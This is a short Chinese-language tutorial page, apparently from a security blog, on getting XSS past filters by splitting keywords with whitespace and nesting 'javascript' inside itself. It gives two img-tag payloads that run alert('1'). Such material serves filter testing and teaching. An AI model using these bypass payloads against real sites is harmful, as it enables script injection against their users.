---
layout: default
---
# ![](../img/hj.jpg)XSS关键字拆分嵌套
空格或回车Tab,利用关键字拆分绕过：
```
<img scr=''javas cript:alert('1')'' width=8>
```
js中除了引号中分隔或遇到分号结束，额外空白都无所谓
```
<img scr=''javasjavascriptcript:alert('1')'' width=8>
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
